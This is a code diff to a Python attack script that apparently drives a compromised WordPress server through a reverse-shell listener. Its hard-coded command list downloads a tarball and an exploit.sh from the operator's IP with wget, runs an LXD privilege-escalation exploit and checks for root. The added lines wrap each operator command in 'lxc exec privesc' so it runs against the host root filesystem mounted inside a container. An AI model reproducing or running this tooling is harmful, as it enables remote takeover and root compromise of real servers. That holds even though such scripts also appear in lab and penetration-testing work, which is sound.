@@ -22,22 +22,44 @@ def listen(ip,port, t2, r_port, file_name):
 		commands = ['cd /srv/www/wordpress\n', 'wget -O {r_port}_file.tar.gz {ip}:{r_port}/{file_name}\n'.format(ip = ip, r_port = r_port, file_name = file_name), 
 		'wget -O exploit.sh {ip}:{r_port}/Privilege_Escalation_LXD/exploit.sh\n'.format(ip = ip, r_port = r_port), 'chmod 755 ./exploit.sh\n', './exploit.sh -f {r_port}_file.tar.gz\n'.format(r_port = r_port),'whoami\n'] #'rm -f {r_port}_file.tar.gz exploit.sh\n'.format(r_port=r_port)]
 		for cmd in commands:
-			ans = conn.recv(32768).decode()
+			ans = recvall(conn)
 			sys.stdout.write(ans)
 			conn.send(cmd.encode())
 			time.sleep(0.2)
 			sys.stdout.write("\033[A" + ans.split("\n")[-1])
-
+		print('''
+		
+		################################################################
+		#							       #
+		#                       Explanation			       #
+		#							       #
+		################################################################
+		
+		In order to have the concept of session, make compound commands.
+		Example, if you wanted to list the contents of /tmp
+		cd /tmp && ls -la
+		
+		Otherwise if you type:
+		cd /tmp
+		ls -la
+		
+		It will list the contents of directory you were when executing cd /tmp
+		''')
+		
 		while True:
 			#Receive data from the target and get user input
 
-			ans = conn.recv(32768).decode()
+			ans = recvall(conn)
 			sys.stdout.write(ans)
 			command = input()
 
-			#Send command with 'lxc exec privesc' to execute it inside the container, but avoid sending it if it's just a newline
+			# Send command with 'lxc exec privesc -- sh -c "cd /mnt/root"', in order to execute the command inside the container
+			# cd /mnt/root is always forced because the filesystem was mounted at this point, that way the user will always be poiting to the root
+			# Since we between commands we lose the concept of session, its always force so we can start from the exact same point
+			
+			
 			if command != "":
-				command = "lxc exec privesc " + command
+				command = "lxc exec privesc -- sh -c \"cd /mnt/root/ && " + command + "\""
 			command += '\n'
 			conn.send(command.encode())
 			time.sleep(0.4)
@@ -123,4 +145,15 @@ def get_file_name():
 		# if match is found
 		if match:
 			return file
+			
+def recvall(sock):
+    BUFF_SIZE = 4096 # 4 KiB
+    data = ''
+    while True:
+        part = sock.recv(BUFF_SIZE).decode()
+        data += part
+        if len(part) < BUFF_SIZE:
+            # either 0 or end of data
+            break
+    return data
 
